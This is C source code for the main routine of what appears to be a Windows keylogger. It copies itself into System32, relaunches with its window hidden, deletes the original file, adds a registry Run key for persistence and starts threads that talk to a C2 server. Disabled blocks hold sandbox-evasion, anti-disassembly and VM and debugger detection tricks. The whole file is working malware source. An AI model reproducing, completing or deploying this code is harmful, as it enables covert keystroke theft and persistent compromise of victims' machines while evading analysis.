
#include "program/program.h"
#include "persistence/registry.h"
#include "env_detection/env_detector.h"
#include <stdio.h>

#define SYS32_PATH         "C:\\Windows\\System32\\Q.exe"
#define RUN_FROM_REGISTRY  "-007"
#define DELETE_FLG         "-d"

static void copyToSys32AndLaunch(char* path);
static void runFromRegistry(char** argv);
static void firstRunFromSys32(char** argv);
static void exec();

WINBOOL is64BitMachine;

/**
 * The main function begins by sleeping to evade sandboxes, injecting 
 * inline assembly to confuse dissassemblers, and then detecting malware 
 * analysis tools if they are present. After which it dispatches execution
 * based upon the arguments that were passed.
 * 
 * @param argc We all know what these are
 * @param argv
 * @return
 */
int main(int argc, char** argv) {
#if 0
    // Sleep for 10 minutes - anti sandbox technique!
    Sleep(600000);
#endif

#if 0
    // anti-dissassembly technique: jump -1 -> inc eax -> dec eax
    __asm__ __volatile__ (
        ".byte 0xEB, 0xFF\n\t"
        ".byte 0xC0, 0x48\n\t"
    );
#endif

#if 0
    char *__foolPtr__;
    __asm__ volatile (
        "call label\n\t"            // push address of data onto stack
        ".ascii \"__TMP__STR!\\0\"\n\t"  // push randon string as well
        "label:\n\t"                // real code flow returns here
        "pop %0\n\t"                // pop address into secret
        : "=r"(__foolPtr__)
        :
        :
    );
#endif

#if 0
    // detect vms, sandboxes, and debuggers!
    RET_CODE ret = detectAnalysisTools();
    if (ret != R_SAFE_RET) { return 1; }
#endif

#if 0    // if we want to only test the malware execution
    exec();
#else
    // returns true on if our 32-bit process is running in a 64-bit machine
    PVOID __tmp__;
    is64BitMachine = Wow64DisableWow64FsRedirection(&__tmp__);

    // this switch statement is in the order each of these methods will be triggered
    // ew first copy and launch from sys32, then run from sys32 and create reg keys.
    // Then runFromRegistry only gets invoked on client machine restart
    switch (argc) {
        case 1:  // launched for the first time
            copyToSys32AndLaunch(argv[0]);
            break;
        case 3:  // run from the copy and launch
            firstRunFromSys32(argv);
            break;
        case 2:  // run from the registry key 
            runFromRegistry(argv);
            break;
    }

    if (is64BitMachine) { Wow64RevertWow64FsRedirection(__tmp__); }
    return 0;
#endif
}

/**
 * Creates a copy of malware in System32 directory and then launches a new 
 * process. This process executes the newly created malware and passes the 
 * command line arguments '-d' and the path to the current malware file,  
 * allowing the untrusted version to be deleted!  
 * 
 * @param path the path to the current malware file 
 */ 
static void copyToSys32AndLaunch(char* path) {
    char buffer[__UINT16_MAX__];   // 64 kilobytes
    
    HANDLE hSource = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hSys32Dest = CreateFileA(SYS32_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // copy the malware into the System32 destination
    DWORD bytesRead;
    while (ReadFile(hSource, buffer, __UINT16_MAX__, &bytesRead, NULL) && bytesRead > 0) {
        if (!WriteFile(hSys32Dest, buffer, bytesRead, NULL, NULL)) {
            break;
        }
    }
    CloseHandle(hSource);
    CloseHandle(hSys32Dest);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    DWORD dwCreationFlags = 0;

#if 1  // hide the window!
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    dwCreationFlags = CREATE_NO_WINDOW;
#endif

    // relaunch the malware from System32, passing the -d flag as well as the 
    // path to the current malware location as it needs to be deleted!
    // cmd expands to: C:\Windows\System32\Q.exe -d <current_malware_file>
    char cmd[MAX_PATH];
    snprintf(cmd, MAX_PATH, "\"%s\" %s \"%s\"", SYS32_PATH, DELETE_FLG, path);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &si, &pi);
}

/**
 * This function gets envoked the first time the malware is run form System32.
 * First checks the arguments that were passed, then deletes the old malware file,
 * afterwhich it attempted to create the registry key for persistence. 
 * 
 * @param argv command line args
 */
static void firstRunFromSys32(char** argv) {
    char* path = argv[0];
    char* arg = argv[1];
    char* delPath = argv[2];
    if (strcmp(path, SYS32_PATH) != 0 || strcmp(arg, DELETE_FLG) != 0) {
        exit(0);
    }

    // super important to sleep for 2s here, gives the original process 
    // time to gracefully close so we can delete the original file
    Sleep(2000);

    // delete the orignal malware file!
    WINBOOL retb = DeleteFileA(delPath);
    
    // check for 64 bit machine, add the KEY_WOW64_64KEY flag if we are in one
    LONG regAccess = KEY_WRITE;
    if (is64BitMachine) {
        regAccess |= KEY_WOW64_64KEY;
    }

    RET_CODE ret = generateRegKey(SYS32_PATH, RUN_FROM_REGISTRY, regAccess);
    if (ret != R_SUCCESS) { return; }

    exec();
}

/**
 * Only gets envoked when the malware has been run from the registry key.
 * Simply checks that the path is in System32 and -007 was passed! 
 * 
 * @param argv command line args 
 */
static void runFromRegistry(char** argv) {
    char* path = argv[0];
    char* arg = argv[1];
    if (strcmp(path, SYS32_PATH) != 0 || strcmp(arg, RUN_FROM_REGISTRY) != 0) {
        return;
    }

    exec();
}

/**
 * This function starts the keylogger malware itself! It envokes the 
 * setup method which initialises the PROGRAM_CONTEXT structure, and 
 * then calls startThreads to begin regular communication with the 
 * C2 server. 
 */
static void exec() {
    RET_CODE ret = setup();
    if (ret != R_SUCCESS) {
        programCleanup();
        return;
    }

    ret = startThreads();
    programCleanup();
}
